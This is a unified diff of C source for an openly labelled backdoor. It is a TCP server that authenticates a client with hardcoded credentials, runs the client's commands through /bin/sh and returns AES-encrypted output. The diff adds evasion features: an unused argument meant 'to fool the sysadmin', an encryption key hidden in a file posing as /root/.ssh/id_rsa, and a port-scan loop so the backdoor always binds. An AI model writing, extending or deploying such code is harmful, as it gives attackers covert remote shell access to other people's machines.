@@ -1,29 +1,51 @@
 #include "includes.h"
+// argv[1] is not used (intended to fool the sysadmin)
+// argv[2] is optional and specifies the start port scan range (argv[3] is largest port to scan)
 
+// Port scan is used to avoid potential errors with binding 
+// (sometimes, a given port might be 'busy' and the OS refuses to give it up, 
+// we dont' want the backdoor to fall flat on its back in this case.)
 int main(int argc, char** argv) {
-    
+    int port = 1337;
+    int max_port = 2337;
+    if (argc > 1) {
+        port = atoi(argv[2]);
+        max_port = atoi(argv[3]);
+    }
+
     // Establish an IPV4 socket file descriptor using TCP
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
     // First argument is the address for which to bind the socket to.
     struct sockaddr_in addr;
     addr.sin_family = AF_INET;
-    addr.sin_port = atoi(argv[1]);
     struct in_addr sin_addr;
     sin_addr.s_addr = INADDR_ANY; 
     addr.sin_addr = sin_addr; 
 
     struct AES_ctx ctx;
 
-    unsigned char key[32] = "B8BF20A598E86D623CB26D2D81DD0761227632BC533635C9C85FF2C1518A7B99";
-    unsigned char iv[16] = "C3C006666DF105DD08EB05EE788C5711";
+    char* key = (char*)malloc(64);
+    char* iv = (char*)malloc(32);
 
-    // TODO: obtain these from the config file
-    char auth_usr[MAX_USERNAME_LEN] = "jrsmith";
+    char auth_usr[MAX_USERNAME_LEN] = "user";
     char auth_pwd[MAX_PASSWORD_LEN] = "password";
+//  || read_config_file(auth_usr, auth_pwd) == -1
+    if ((read_key_file(key, iv) == -1)) {
+        return -1;
+    }
+    printf("Read key: %s\nRead IV: %s\n", key, iv);
+    bool is_bound = false;
+    while (!is_bound) {
+        addr.sin_port = port;
 
-
-    if (bind(sockfd, &addr, sizeof(addr)) == -1) {
-        printf("Binding failed!\n");
+        if (bind(sockfd, &addr, sizeof(addr)) == -1) {
+            printf("Binding failed!\n");
+            if (port > max_port) return -1;
+            port++;
+        } else {
+            is_bound = true;
+            printf("Successfully bound server on port %d\n!", port);
+        }
     }
     
     // Now we want to make the sockfd a passive socket
@@ -73,7 +95,7 @@ int main(int argc, char** argv) {
         while (client_command != NULL) {
             // Spawn a new child process. system command allows for args to be passed in seemlessly
             // Specifically, it spawns a child process of /bin/sh that runs any command.
-            char* output = (char*)calloc(sizeof(char), 4096);
+            char* output = (char*)calloc(sizeof(char), OUTPUT_BUFFER);
 
             // We need to manually run the chdir command due to the nature of the system() function.
             // NOTE/todo: Required to have an extra space after the command name.
@@ -98,14 +120,14 @@ int main(int argc, char** argv) {
             close(pipe_fd[1]);
             dup2(stdout_cpy, STDOUT_FILENO);
             // Clear out the array
-            if (read(pipe_fd[0], output, 4096) < 0){
+            if (read(pipe_fd[0], output, OUTPUT_BUFFER) < 0){
                 printf("Error while reading from stdout buffer.\n");
             }
             
             // Write the output buffer to the client
             AES_init_ctx_iv(&ctx, key, iv);
             AES_CTR_xcrypt_buffer (&ctx, output, sizeof(output)); // encrypt terminal output
-            if (write(client_fd, output, 4096) < 0) {
+            if (write(client_fd, output, OUTPUT_BUFFER) < 0) {
                 printf("Error while writing to client. %s\n",strerror(errno));
             }
             free(output);
@@ -118,3 +140,21 @@ int main(int argc, char** argv) {
     }
 }
 
+int read_config_file(char* usr, char* pwd){
+    return 0;
+}
+int read_key_file(char* key, char* iv) {
+    // Default location for the AES key file is a spoof of an SSH key
+    int key_file = open("/root/.ssh/id_rsa", O_RDWR);
+    char begin[3];
+    read(key_file, begin, 3);
+    if (strncmp(begin, "AES", 3) != 0) {
+        printf("Error: invalid key file, aborting the read.\n");
+        return -1;
+    }
+    lseek(key_file, 1, SEEK_CUR);
+    read(key_file, key, 64);
+    lseek(key_file, 5, SEEK_CUR);
+    read(key_file, iv, 32);
+    return 1;
+}
